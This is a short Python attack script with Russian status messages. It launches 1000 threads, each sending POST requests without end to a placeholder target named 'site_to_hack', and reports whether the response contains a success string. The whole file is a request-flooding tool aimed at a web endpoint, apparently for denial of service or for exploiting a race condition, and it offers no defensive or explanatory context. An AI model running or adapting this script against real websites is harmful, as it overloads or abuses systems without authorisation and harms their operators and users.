import requests, threading

url = "http://site_to_hack/path"

def send():
    while True:
        response = requests.post(url,data={"parametr":"attacker"}).text
        if "реквест удался" in response:
            print("все отлично")
        else:
            print("все плохо")

array = [threading.Thread(target=send).start() for x in range(1000)]